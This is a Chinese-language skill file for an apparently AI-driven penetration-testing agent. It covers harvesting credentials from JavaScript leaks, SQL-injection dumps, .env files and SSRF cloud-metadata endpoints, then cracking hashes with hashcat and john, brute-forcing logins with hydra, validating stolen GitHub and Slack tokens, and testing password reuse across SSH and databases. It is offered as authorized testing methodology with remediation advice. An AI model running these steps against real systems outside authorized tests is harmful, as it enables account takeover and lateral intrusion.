---
name: credential-harvesting
description: 凭证收集与利用技能，系统化从各测试阶段（XSS/SQLi/SSRF/目录遍历/Git泄露等）提取的凭证，进行验证、分类、横向利用和密码破解
metadata:
  version: 1.0.0
  categories: [exploitation, post-exploitation, credential-management]
  requires_tools: [hashcat, john]
---

# Credential Harvesting & Exploitation

## 使用边界与发散原则

- 本 skill 是最低覆盖要求、风险清单和证据标准，不是唯一测试路径或固定脚本。执行时必须根据目标技术栈、入口形态、认证状态、业务流程、已有证据、WAF/限速和授权范围调整方法。
- 文中的步骤、payload、命令、工具名和执行顺序默认是候选方法；除非本 skill、系统提示或后端门禁明确写为“必须/禁止/强制”，不要照抄固定列表，也不要因为示例没覆盖某个旁路、协议、参数位置、文件格式或业务入口就跳过。
- 发现阶段的字符串、端点、token、id、报错、组件名和扫描命中只作为候选信号；先记录和复核，不要仅凭单个关键词直接认定漏洞或加载多个无关专项流程。只有交互证据、可复现行为或明确进入对应专项测试时，才提升为专项验证。
- 每一步都应输出证据、判断理由和下一步分支；工具失败时先修参数、配置、环境或改用更合适的专业工具，确认无法覆盖时再使用通用命令兜底。
- 授权范围、低噪声、数据最小化、复现证据、误报排除和报告要求是硬边界；这些约束高于任何示例命令或默认流程。

## 概述

在渗透测试过程中，凭证散落在多个测试阶段和发现中。本skill提供系统化方法，将从各种攻击面收集的凭证统一管理、验证有效性、尝试横向利用。

**核心价值**：
- 从各个漏洞发现中统一提取凭证
- 验证凭证有效性并分类
- 密码复用测试（横向移动）
- 弱密码/默认密码检测
- 密码hash破解

---

## 凭证来源分类

### 来源1：前端代码泄露

```markdown
发现渠道：
- lazy-js-discovery → 懒加载JS中的硬编码密钥
- 源码中的注释
- Source Map恢复的源码
- 前端配置文件

常见类型：
- API密钥（第三方服务）
- AWS/云凭证
- 内部服务Token
- 管理员后台默认密码
```

#### 提取方法

```python
# 从JS代码中提取凭证
credential_patterns = {
    'aws_access_key': r'AKIA[0-9A-Z]{16}',
    'aws_secret_key': r'[A-Za-z0-9/+=]{40}',
    'github_token': r'ghp_[a-zA-Z0-9]{36}',
    'github_oauth': r'gho_[a-zA-Z0-9]{36}',
    'google_api': r'AIza[0-9A-Za-z\-_]{35}',
    'firebase': r'AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}',
    'slack_token': r'xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24,34}',
    'jwt_token': r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
    'private_key': r'-----BEGIN (?:RSA )?PRIVATE KEY-----',
    'generic_api_key': r'(?i)(api[_-]?key|apikey|api_secret)\s*[:=]\s*[\'"`]([^\'"` ]{20,})[\'"`]',
    'generic_password': r'(?i)(password|passwd|pwd)\s*[:=]\s*[\'"`]([^\'"` ]{4,})[\'"`]',
    'generic_secret': r'(?i)(secret|token)\s*[:=]\s*[\'"`]([^\'"` ]{10,})[\'"`]',
    'connection_string': r'(?i)(mongodb|mysql|postgres|redis)://[^\s\'\"]+',
    'bearer_token': r'Bearer\s+[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+',
}

def extract_credentials(code, source_file):
    findings = []
    for cred_type, pattern in credential_patterns.items():
        matches = re.findall(pattern, code)
        for match in matches:
            findings.append({
                'type': cred_type,
                'value': match if isinstance(match, str) else match[-1],
                'source': source_file,
                'context': get_surrounding_lines(code, match)
            })
    return findings
```

---

### 来源2：SQL注入导出

```markdown
发现渠道：
- sql-injection-testing → 数据库dump
- 错误信息中的连接字符串
- 备份文件中的数据库导出

常见类型：
- 用户密码hash
- 管理员明文密码
- 数据库连接凭证
- Session token
```

#### 提取方法

```python
# 从SQLi dump中提取用户凭证
def parse_sqli_dump(dump_text):
    credentials = []

    # 模式1：username:password_hash
    for line in dump_text.split('\n'):
        # MySQL格式
        match = re.match(r'(\w+):([*][A-F0-9]{40})', line)
        if match:
            credentials.append({
                'username': match.group(1),
                'hash': match.group(2),
                'hash_type': 'mysql_sha1'
            })

        # 通用格式 username|email|password
        parts = line.split('|')
        if len(parts) >= 3:
            credentials.append({
                'username': parts[0].strip(),
                'email': parts[1].strip(),
                'password_or_hash': parts[2].strip()
            })

    return credentials
```

---

### 来源3：信息泄露

```markdown
发现渠道：
- 目录遍历/本地文件包含
- Git仓库泄露 (.git/)
- 配置文件暴露 (.env, config.yaml)
- 备份文件 (.bak, .old)
- 错误页面信息

常见类型：
- 环境变量中的密钥
- SSH私钥
- 数据库连接凭证
- 第三方API密钥
```

#### 提取方法

```python
# .env文件解析
def parse_env_file(content):
    credentials = []
    for line in content.split('\n'):
        line = line.strip()
        if '=' in line and not line.startswith('#'):
            key, value = line.split('=', 1)
            key = key.strip()
            value = value.strip().strip('"').strip("'")

            if any(keyword in key.upper() for keyword in
                   ['PASSWORD', 'SECRET', 'KEY', 'TOKEN', 'API_KEY', 'CREDENTIALS']):
                credentials.append({
                    'key': key,
                    'value': value,
                    'type': 'env_variable'
                })

    return credentials
```

---

### 来源4：网络嗅探

```markdown
发现渠道：
- HTTP基本认证（Base64解码）
- 未加密的表单提交
- Cookie中的session token
- WebSocket握手中的token

常见类型：
- HTTP Basic Auth凭证
- 登录表单明文密码
- Session ID
- OAuth token
```

---

### 来源5：SSRF内网探测

```markdown
发现渠道：
- ssrf-testing → 云元数据端点
- 内网服务配置
- 容器环境变量

常见类型：
- AWS IAM临时凭证
- Kubernetes service account token
- 内网服务凭证
```

#### 云元数据提取

```python
# AWS元数据
aws_metadata_endpoints = [
    '/latest/meta-data/iam/security-credentials/',
    '/latest/meta-data/iam/security-credentials/{role_name}',
]

# 提取AWS临时凭证
def parse_aws_metadata(response):
    data = json.loads(response)
    return {
        'type': 'aws_iam_temp',
        'access_key': data.get('AccessKeyId'),
        'secret_key': data.get('SecretAccessKey'),
        'session_token': data.get('Token'),
        'expiration': data.get('Expiration')
    }
```

---

## 凭证处理流程

### 阶段1：收集与去重

```python
class CredentialStore:
    def __init__(self):
        self.credentials = []

    def add(self, credential):
        """添加凭证并去重"""
        # 基于value去重
        for existing in self.credentials:
            if existing['value'] == credential['value']:
                # 合并来源
                existing['sources'].append(credential['source'])
                return

        credential['sources'] = [credential['source']]
        credential['status'] = 'unverified'
        credential['verified_at'] = None
        self.credentials.append(credential)

    def export(self, format='json'):
        """导出凭证库"""
        return json.dumps(self.credentials, indent=2)
```

---

### 阶段2：Hash识别与分类

```python
# Hash类型识别
hash_patterns = {
    'md5': r'^[a-f0-9]{32}$',
    'sha1': r'^[a-f0-9]{40}$',
    'sha256': r'^[a-f0-9]{64}$',
    'sha512': r'^[a-f0-9]{128}$',
    'mysql_sha1': r'^\*[A-F0-9]{40}$',
    'bcrypt': r'^\$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}$',
    'ntlm': r'^[a-f0-9]{32}$',
    'md5crypt': r'^\$1\$[./0-9A-Za-z]{8}\$[./0-9A-Za-z]{22}$',
    'sha256crypt': r'^\$5\$[./0-9A-Za-z]{16}\$[./0-9A-Za-z]{43}$',
    'sha512crypt': r'^\$6\$[./0-9A-Za-z]{16}\$[./0-9A-Za-z]{86}$',
    'argon2': r'^\$argon2[id]+\$v=\d+\$m=\d+,t=\d+,p=\d+\$',
}

def identify_hash(hash_value):
    for hash_type, pattern in hash_patterns.items():
        if re.match(pattern, hash_value):
            return hash_type
    return 'unknown'

# Hashcat模式映射
hashcat_modes = {
    'md5': 0,
    'sha1': 100,
    'sha256': 1400,
    'sha512': 1700,
    'mysql_sha1': 300,
    'bcrypt': 3200,
    'ntlm': 1000,
    'md5crypt': 500,
    'sha256crypt': 7400,
    'sha512crypt': 1800,
}
```

---

### 阶段3：密码破解

#### 3.1 使用hashcat

```bash
# 字典攻击
hashcat -a 0 -m {mode} hashes.txt /usr/share/wordlists/rockyou.txt

# 规则攻击（字典+变形规则）
hashcat -a 0 -m {mode} hashes.txt rockyou.txt -r rules/best64.rule

# 组合攻击
hashcat -a 1 -m {mode} hashes.txt wordlist1.txt wordlist2.txt

# 掩码攻击（已知密码模式）
hashcat -a 3 -m {mode} hashes.txt ?u?l?l?l?l?d?d?d  # 如: Admin123
hashcat -a 3 -m {mode} hashes.txt ?l?l?l?l?l?l?d?d?d?s  # 如: hello123!
```

#### 3.2 使用john

```bash
# 自动检测hash类型
john --wordlist=rockyou.txt hashes.txt

# 指定格式
john --format=bcrypt --wordlist=rockyou.txt hashes.txt

# 显示结果
john --show hashes.txt
```

#### 3.3 在线Hash查询

```python
# 查询在线hash数据库（已知hash→明文）
online_services = [
    'https://crackstation.net/api',
    'https://hashes.org/api',
]

# 注意：仅对常见弱密码有效
# 对于复杂密码仍需本地破解
```

---

### 阶段4：凭证验证

#### 4.1 Web应用凭证验证

```python
def verify_web_credentials(url, credentials):
    """验证Web应用登录凭证"""
    results = []

    for cred in credentials:
        # 尝试登录
        response = requests.post(f'{url}/login', data={
            'username': cred['username'],
            'password': cred['password']
        })

        # 判断是否成功
        if response.status_code == 200 and 'dashboard' in response.url:
            cred['status'] = 'valid'
            cred['access_level'] = detect_access_level(response)
        elif response.status_code == 403:
            cred['status'] = 'valid_locked'  # 凭证正确但账户被锁定
        else:
            cred['status'] = 'invalid'

        results.append(cred)

    return results
```

#### 4.2 API密钥验证

```python
def verify_api_keys(credentials):
    """验证各类API密钥"""

    for cred in credentials:
        if cred['type'] == 'aws_access_key':
            # 验证AWS密钥
            # aws sts get-caller-identity
            pass

        elif cred['type'] == 'github_token':
            # 验证GitHub Token
            response = requests.get('https://api.github.com/user',
                headers={'Authorization': f'token {cred["value"]}'})
            cred['valid'] = response.status_code == 200
            if cred['valid']:
                cred['github_user'] = response.json().get('login')
                cred['scopes'] = response.headers.get('X-OAuth-Scopes')

        elif cred['type'] == 'slack_token':
            # 验证Slack Token
            response = requests.get('https://slack.com/api/auth.test',
                headers={'Authorization': f'Bearer {cred["value"]}'})
            cred['valid'] = response.json().get('ok', False)
```

#### 4.3 SSH私钥验证

```bash
# 测试SSH私钥是否有效
ssh -i private_key.pem -o BatchMode=yes -o ConnectTimeout=5 user@target

# 如果无密码保护则直接连接
# 如果有密码保护，需要先破解
ssh2john private_key.pem > key_hash.txt
john --wordlist=rockyou.txt key_hash.txt
```

---

### 阶段5：密码复用测试

#### 5.1 横向测试策略

```python
def password_reuse_test(credentials, targets):
    """
    将已验证的凭证在其他目标上测试

    targets: [
        {'type': 'web', 'url': 'https://admin.target.com'},
        {'type': 'ssh', 'host': '10.0.0.5'},
        {'type': 'database', 'host': '10.0.0.10', 'port': 3306},
    ]
    """
    reuse_findings = []

    for cred in credentials:
        if cred['status'] != 'valid':
            continue

        for target in targets:
            if target['type'] == 'web':
                # 尝试Web登录
                success = try_web_login(target['url'], cred)
            elif target['type'] == 'ssh':
                # 尝试SSH
                success = try_ssh(target['host'], cred)
            elif target['type'] == 'database':
                # 尝试数据库连接
                success = try_db_connect(target, cred)

            if success:
                reuse_findings.append({
                    'credential': cred,
                    'target': target,
                    'risk': 'high - password reuse'
                })

    return reuse_findings
```

#### 5.2 默认凭证检查

```python
# 常见默认凭证
default_credentials = [
    # Web应用
    {'username': 'admin', 'password': 'admin'},
    {'username': 'admin', 'password': 'password'},
    {'username': 'admin', 'password': '123456'},
    {'username': 'root', 'password': 'root'},
    {'username': 'test', 'password': 'test'},

    # 数据库
    {'username': 'root', 'password': ''},
    {'username': 'postgres', 'password': 'postgres'},
    {'username': 'sa', 'password': ''},

    # 网络设备
    {'username': 'admin', 'password': 'admin'},
    {'username': 'cisco', 'password': 'cisco'},

    # CMS
    {'username': 'admin', 'password': 'admin123'},
    {'username': 'administrator', 'password': 'changeme'},
]

def check_default_credentials(target, service_type):
    """针对特定服务类型检查默认凭证"""
    for cred in default_credentials:
        if try_login(target, cred):
            return {'finding': 'default_credential', 'credential': cred}
    return None
```

---

### 阶段6：凭证评估

```python
def assess_credential_impact(credential):
    """评估凭证泄露的影响"""

    impact = {
        'severity': 'low',
        'scope': [],
        'recommendations': []
    }

    if credential['type'] == 'aws_access_key':
        impact['severity'] = 'critical'
        impact['scope'] = ['AWS账户完全访问', '数据泄露', '资源滥用']
        impact['recommendations'] = ['立即轮换密钥', '检查CloudTrail日志']

    elif credential['type'] == 'generic_password' and credential.get('access_level') == 'admin':
        impact['severity'] = 'critical'
        impact['scope'] = ['管理员权限', '数据完全访问', '系统配置修改']
        impact['recommendations'] = ['强制密码重置', '启用MFA']

    elif credential['type'] == 'jwt_token':
        impact['severity'] = 'high'
        impact['scope'] = ['身份冒充', '权限提升']
        impact['recommendations'] = ['轮换JWT密钥', '检查token使用日志']

    elif credential['type'] == 'github_token':
        impact['severity'] = 'high'
        impact['scope'] = ['代码仓库访问', '供应链攻击']
        impact['recommendations'] = ['撤销token', '审计仓库权限']

    return impact
```

---

## 工具集成

### 与其他skill协作

```markdown
工作流：
1. lazy-js-discovery → 发现前端代码中的凭证
2. sql-injection-testing → dump用户表获取密码hash
3. ssrf-testing → 获取云元数据凭证
4. xss-testing → 窃取Cookie/Token
5. ⬇️ 凭证统一流入本skill ⬇️
6. credential-harvesting → 分类、验证、破解、复用测试
7. 输出：验证后的凭证列表 + 密码复用发现 + 影响评估
```

### CyberStrikeAI工具

```bash
# 密码破解
hashcat -a 0 -m {mode} hashes.txt wordlist.txt
john --wordlist=rockyou.txt hashes.txt

# 在线爆破（谨慎使用，注意速率）
hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Login failed"
```

---

## 输出报告模板

```markdown
# 凭证收集报告

## 概要
- 总发现凭证: 47个
- 验证有效: 23个
- 已破解Hash: 8个
- 密码复用发现: 3个

## 凭证分类

| 类型 | 数量 | 有效 | 严重性 |
|------|------|------|--------|
| 硬编码API Key | 12 | 8 | 高 |
| 用户密码Hash | 20 | 8(已破解) | 严重 |
| AWS凭证 | 2 | 2 | 严重 |
| JWT Token | 5 | 3 | 高 |
| SSH私钥 | 1 | 1 | 严重 |
| 默认密码 | 7 | 5 | 中 |

## 关键发现

### [严重] AWS IAM凭证泄露
**来源**: SSRF读取EC2元数据
**凭证**: AKIA...（已脱敏）
**权限**: AdministratorAccess
**影响**: AWS账户完全控制

### [严重] 管理员密码复用
**发现**: admin用户在3个系统使用相同密码
**系统**: Web后台、数据库、SSH
**影响**: 攻陷一个系统即可横向移动

### [高危] 8个用户弱密码
**破解方式**: hashcat + rockyou.txt
**耗时**: 2分钟
**密码特征**:
- admin123 (3个)
- password1 (2个)
- qwerty (2个)
- 123456 (1个)

## 修复建议

1. **立即轮换所有泄露凭证**
2. **实施强密码策略** (12+字符, 复杂度要求)
3. **启用MFA** (特别是管理员账户)
4. **移除硬编码凭证** (使用Secret Manager)
5. **实施密码唯一性检查** (防止密码复用)
6. **定期凭证审计** (自动化扫描)
```

---

## 最佳实践

### ✅ DO

- **即时记录**: 每发现一个凭证立即录入凭证库
- **安全存储**: 凭证报告加密存储，限制访问
- **来源追溯**: 记录每个凭证的发现来源和上下文
- **影响评估**: 验证凭证的实际权限范围
- **客户沟通**: 严重凭证泄露立即通知客户

### ❌ DON'T

- 不要在报告中包含完整的高权限凭证明文
- 不要使用获取的凭证做授权范围外的操作
- 不要在公开信道传输凭证
- 不要保留超出测试所需的凭证副本
- 测试结束后确保所有临时凭证文件安全删除

---

## 参考资料

- [Hashcat Wiki](https://hashcat.net/wiki/)
- [SecLists - Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials)
- [PayloadsAllTheThings - Hash Cracking](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Hash%20Cracking.md)
